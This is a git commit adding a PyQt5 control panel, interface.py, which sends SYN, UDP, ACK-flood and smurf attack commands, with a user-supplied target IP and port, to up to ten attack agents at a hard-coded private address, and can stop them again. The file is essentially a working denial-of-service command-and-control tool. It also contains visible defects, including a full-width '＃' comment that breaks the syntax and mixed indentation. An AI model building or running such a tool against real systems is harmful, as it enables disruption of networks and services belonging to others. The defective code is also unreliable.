dcfb63136e32de9d90f6c6dc511f107655a8a4a3
ideiowo <107016864+ideiowo@users.noreply.github.com>
2022-06-21 15:53:33 +0800

    Add files via upload

---
+++ interface.py
@@ -0,0 +1,160 @@
+from PyQt5 import QtWidgets, QtGui, QtCore
+
+# 引用ui.py檔案中的物件 
+from ui import Ui_MainWindow
+
+import requests
+import ipaddress
+
+
+URL_1 = 'http://192.168.126.132:9999/'
+URL_2 = 'http://192.168.126.132:9999/'
+URL_3 = 'http://192.168.126.132:9999/'
+URL_4 = 'http://192.168.126.132:9999/'
+URL_5 = 'http://192.168.126.132:9999/'
+URL_6 = 'http://192.168.126.132:9999/'
+URL_7 = 'http://192.168.126.132:9999/'
+URL_8 = 'http://192.168.126.132:9999/'
+URL_9 = 'http://192.168.126.132:9999/'
+URL_10 = 'http://192.168.126.132:9999/'
+
+
+class MainWindow(QtWidgets.QMainWindow):
+
+    def __init__(self):
+        super().__init__() # in python3, super(Class, self).xxx = super().xxx
+        self.ui = Ui_MainWindow()
+        self.ui.setupUi(self)
+
+    
+        #下拉式選單物件、顯示的文字
+        self.ui.comboBox.addItems(['1','2','3','4','5','6','7','8','9','10'])
+        #控制端
+        self.setup_control()
+        
+    def setup_control(self):
+        self.ui.changelabel.setText('Attack Detail')
+        
+        #Attack按鈕的觸發事件buttonClicked
+        self.ui.pushButton.clicked.connect(self.buttonClicked)
+        
+        #Stop按鈕的觸發事件button_2Clicked
+        self.ui.pushButton_2.clicked.connect(self.button_2Clicked)
+    
+    #攻擊事件
+    def buttonClicked(self):
+    	
+    	#下拉式選單對應的主機位址
+    	host = self.ui.comboBox.currentText()
+    	match host:
+        	case '1':url = URL_1
+        	case '2':url = URL_2
+        	case '3':url = URL_3
+        	case '4':url = URL_4
+        	case '5':url = URL_5
+        	case '6':url = URL_6
+        	case '7':url = URL_7
+        	case '8':url = URL_8
+        	case '9':url = URL_9
+        	case '10':url = URL_10
+        
+        # 攻擊目標的IP 
+    	IP = self.ui.lineEdit.text()
+    	
+    	# 攻擊目標的Port	
+    	port = self.ui.lineEdit_2.text()
+    	
+    	# 攻擊目標的Broadcast address	
+    	BdstIP = ipaddress.ip_network( IP + "/24" , strict=False).broadcast_address
+    	
+    	# 根據下拉市式選單，填入post請求的data
+    	if self.ui.radioButton.isChecked():
+    		mode = 'S'
+    		my_data = {'attack':'tcp_attack', 'IP':IP, 'port':port,'mode':mode}
+    		data_detail = f"attack:syn_attack,IP:{IP},port:{port},mode:{mode}"
+    		
+    	if self.ui.radioButton_2.isChecked():
+    		my_data = {'attack':'udp_attack', 'IP':IP, 'port':port}
+    		data_detail = f"attack:udp_attack,IP:{IP},port:{port}"
+    		
+    	if self.ui.radioButton_3.isChecked():
+    		mode = 'A'
+    		my_data = {'attack':'tcp_attack', 'IP':IP, 'port':port,'mode':mode}
+    		data_detail = f"attack:ack_attack,IP:{IP},port:{port}"
+    		
+    	if self.ui.radioButton_4.isChecked():
+    		my_data = {'attack':'smurf_attack', 'IP':IP, 'port':port,'BdstIP':BdstIP}
+    		data_detail = f"attack:smurf_attack,IP:{IP},port:{port}"
+    		attack = "smurf_attack"
+    		
+    	start_url = url + 'start'
+    	
+    	#post請求的主機位址+請求內容(my_data)
+    	r = requests.post(start_url, data=my_data)
+    	
+    	#在界面上顯示攻擊的詳細資訊
+    	self.ui.changelabel.setText(f"{url} \n{data_detail}")
+    	
+    	＃根據主機，填入相應欄位資訊
+    	match host:
+        	case '1':self.ui.lineEdit1.setText(f"{data_detail}")
+        	case '2':self.ui.lineEdit2.setText(f"{data_detail}")
+        	case '3':self.ui.lineEdit3.setText(f"{data_detail}")
+        	case '4':self.ui.lineEdit4.setText(f"{data_detail}")
+        	case '5':self.ui.lineEdit5.setText(f"{data_detail}")
+        	case '6':self.ui.lineEdit6.setText(f"{data_detail}")
+        	case '7':self.ui.lineEdit7.setText(f"{data_detail}")
+        	case '8':self.ui.lineEdit8.setText(f"{data_detail}")
+        	case '9':self.ui.lineEdit9.setText(f"{data_detail}")
+        	case '10':self.ui.lineEdit10.setText(f"{data_detail}")
+    	    
+    #停止主機攻擊事件	
+    def button_2Clicked(self):
+    	#根據主機改變url,清除相應欄位
+    	host = self.ui.comboBox.currentText()
+    	match host:
+        	case '1':
+        		url = URL_1
+        		self.ui.lineEdit1.clear()
+        	case '2':
+        		url = URL_2
+        		self.ui.lineEdit2.clear()
+        	case '3':
+        		url = URL_3
+        		self.ui.lineEdit3.clear()
+        	case '4':
+        		url = URL_4
+        		self.ui.lineEdit4.clear()
+        	case '5':
+        		url = URL_5
+        		self.ui.lineEdit5.clear()
+        	case '6':
+        		url = URL_6
+        		self.ui.lineEdit6.clear()
+        	case '7':
+        		url = URL_7
+        		self.ui.lineEdit7.clear()
+        	case '8':
+        		url = URL_8
+        		self.ui.lineEdit8.clear()
+        	case '9':
+        		url = URL_9
+        		self.ui.lineEdit9.clear()
+        	case '10':
+        		url = URL_10
+        		self.ui.lineEdit10.clear()
+        	
+    	
+    	stop_url = url + 'stop'
+    	#對選定主機post stop請求
+    	r = requests.get(stop_url)
+    	#在界面上顯示停止攻擊
+    	self.ui.changelabel.setText("Stop")
+       
+
+if __name__ == '__main__' :
+    import sys
+    app = QtWidgets.QApplication(sys.argv)
+    window =MainWindow()
+    window.show()
+    sys.exit(app.exec_())
